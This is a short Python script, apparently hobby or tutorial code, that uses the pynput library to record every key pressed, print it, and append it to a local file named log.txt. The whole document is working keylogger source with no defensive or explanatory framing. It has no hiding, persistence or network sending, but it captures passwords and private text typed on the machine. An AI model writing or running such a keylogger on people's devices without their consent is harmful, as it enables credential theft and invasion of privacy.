from pynput.keyboard import Listener

def writetofile(key):
    letter = str(key).replace("'", "")

    if letter == 'Key.enter':
        letter = "\n"
    elif letter == 'Key.space':
        letter = ' '
    elif len(letter) > 1:
        letter = ''

    print(letter)
    with open("log.txt", "a") as f:
        f.write(letter)

with Listener(on_press=writetofile) as l:
    l.join()